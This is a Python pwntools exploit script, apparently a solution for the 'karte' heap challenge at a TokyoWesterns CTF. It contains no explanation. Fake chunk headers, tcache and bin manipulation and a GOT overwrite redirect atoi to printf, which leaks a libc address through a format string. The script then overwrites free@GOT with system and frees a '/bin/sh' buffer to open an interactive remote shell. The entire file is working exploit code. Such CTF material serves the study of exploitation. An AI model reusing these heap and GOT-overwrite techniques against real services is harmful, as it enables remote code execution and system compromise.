#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
host = "10.211.55.19"
port = 8888
host = "karte.chal.ctf.westerns.tokyo"
port = 10001
context.arch = "amd64"    
r = remote(host,port)

def add(size,desc):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(">")
    r.sendline(str(size))
    r.recvuntil(">")
    r.send(desc)
    r.recvuntil("id ")
    return int(r.recvuntil("\n"))

def addnoret(size,desc):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(">")
    r.sendline(str(size))
    r.recvuntil(">")
    r.send(desc)

def free(idx):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(">")
    r.sendline(str(idx))

def modify(idx,data):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(">")
    r.sendline(str(idx))
    r.recvuntil(">")
    r.send(data)

def rename(name):
    r.recvuntil(">")
    r.sendline("99")
    r.recvuntil("...")
    r.send(name)
r.recvuntil("...")
name = p64(0) + p64(0x21) + p64(0) + p64(0x21)+ p64(0)*1+ p64(0x11) + p64(0xfffffffffffffff1) + '\x01'
r.send(name)
fake  =0x6021b0
id1 = add(0xa00000,'da')
free(id1)
id1 = add(0xa00000,'da')
free(id1)

for i in range(7):
    id1 = add(0x10,"da")
    free(id1)
id1 = add(0x10,"da")
id2 = add(0x10,'ggwp')
id3 = add(0x800,'xx')
free(id2)
free(id1)
modify(id1,p64(fake)[:4])
free(id3)
rename(p64(0)*3 + p64(0xa00001))
id4 = add(0xa00000,'da')
rename(p64(0xfffffffffffffff0)+p64(0)*2+p64(0xfffffffffffffff3)*1)
target  = 0x0000000000602100
nb = target - (fake+0x10) 
r.recvuntil(">")
r.sendline("1")
r.recvuntil(">")
r.sendline(str(nb))
r.recvuntil("Added id ")
fuckid = int(r.recvuntil("\n"))
print fuckid
free(id4)
rename(p64(0xa0) +p64(0)*2 + p64(0x21) + p64(0)*3 + '\x11' + '\x00'*2)
free(fuckid)
addnoret(0x31,p64(0)*4 + p64(0x21))
r.send(p64(0x1337))
rename("/bin/sh\x00" +p64(0)*2 + p64(0x21) + p64(0x602130-8)+p64(0)*2 + '\x11' + '\x00'*2)
free(0x1337)
addnoret(0x10,'a')
r.send(p64(0x1339))
addnoret(0x18,p64(0) + p64(0) + p64(0x811)[:7])
r.send(p64(0x1338))
r.recvuntil(">")
r.sendline("1")
r.recvuntil(">")
r.sendline("2049")
atoi_got = 0x602078
free_got = 0x602018
self = 0x602158
r.send(p64(1) + p64(atoi_got) + p32(1) + p32(1) + p64(self) + p64(0x0000deadc0bebeef))
r.recvuntil(">")
r.send(p64(1))
r.sendline("")
printf = 0x400760
modify(0,p64(printf)[:6])
r.recvuntil(">")
r.sendline('aaa')
r.recvuntil(">")
r.sendline("%21$p")
libc = int(r.recvuntil("karte")[1:-5],16) - 0x21b97
print hex(libc)
r.recvuntil(">")
r.sendline('aaaa')
r.recvuntil(">")
r.sendline('a')
system = libc + 0x4f440
r.recvuntil(">")
r.send(p64(free_got)[:3])

r.sendline('aaaa')
r.recvuntil(">")
r.sendline('')
system = libc + 0x4f440
r.recvuntil(">")
r.send(p64(system)[:6])

r.sendline('aaaa')
r.recvuntil(">")
r.sendline('a')
system = libc + 0x4f440
r.recvuntil(">")
r.send(p64(0x6021a0)[:3])

r.recvuntil(">")
r.sendline('aaa')
r.recvuntil(">")
r.sendline("")
r.interactive()
